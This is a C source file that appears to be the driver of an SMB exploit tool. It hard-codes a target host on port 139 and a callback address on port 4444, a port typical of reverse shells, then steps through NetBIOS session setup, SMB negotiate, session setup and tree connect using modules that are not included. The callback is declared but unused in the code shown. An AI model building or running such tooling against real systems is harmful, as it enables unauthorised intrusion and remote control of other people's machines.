// Network
#include <arpa/inet.h>
#include <sys/socket.h>

// Std
#include <stdint.h>
#include <stdio.h>
// #include <stdlib.h>
#include <string.h>
#include <unistd.h>

// Modules
#include "./src/nbios_com_session_setup/module_ptr.h"
#include "./src/smb_com_negotiate/module_ptr.h"
#include "./src/smb_com_session_setup_andx/module_ptr.h"
#include "./src/smb_com_tree_connect_andx/module_ptr.h"

// TARGET
static uint8_t ADDRESS[4] = {0xc0, 0xa8, 0x01, 0x68};
static uint16_t PORT = 139;

// CALLBACK
static uint8_t CALLBACK_ADDRESS[4] = {0xc0, 0xa8, 0x01, 0x03};
static uint16_t CALLBACK_PORT = 4444;

int getsock() {
  const int SOCK = socket(AF_INET, SOCK_STREAM, 0);

  if (SOCK < 0) {
    return -1;
  };

  struct timeval tv;
  tv.tv_sec = 0;
  tv.tv_usec = 200000;

  if (setsockopt(SOCK, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(struct timeval)) <
      0) {
    return -1;
  }

  if (setsockopt(SOCK, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(struct timeval)) <
      0) {
    return -1;
  };

  return SOCK;
}

int sock_connect(int sock, uint8_t *address, uint16_t port) {

  struct sockaddr_in sa;
  sa.sin_family = AF_INET;
  memcpy(&sa.sin_addr, address, 4);
  sa.sin_port = htons(port);
  memset(sa.sin_zero, 0, 8);

  return connect(sock, (struct sockaddr *)&sa, sizeof(struct sockaddr));
}

int main() {
  int sock = getsock();

  if (sock < 0) {
    printf("ERR: Socket error\n");
    return -1;
  };

  if (sock_connect(sock, ADDRESS, PORT) < 0) {
    printf("ERR: connection error\n");
    return -1;
  }

  // nbios_com_session_setup
  if (nbios_com_session_setup(sock) < 0) {
    printf("ERR: [NBIOS_COM_SESSION_SETUP] - failed\n");

    close(sock);
    return -1;
  }

  if (smb_com_negotiate(sock) < 0) {
    printf("ERR: [SMB_COM_NEGOTIATE] - failed\n");

    close(sock);
    return -1;
  }

  short user_id = smb_com_session_setup_andx(sock);

  if (user_id < 0) {
    printf("ERR: [SMB_COM_SESSION_SETUP_ANDX] - failed\n");

    close(sock);
    return -1;
  }

  short tree_id = smb_com_tree_connect_andx(sock, user_id);

  if (tree_id < 0) {
    printf("ERR: [SMB_COM_TREE_CONNECT_ANDX] - failed\n");

    close(sock);
    return -1;
  }

  return 0;
};
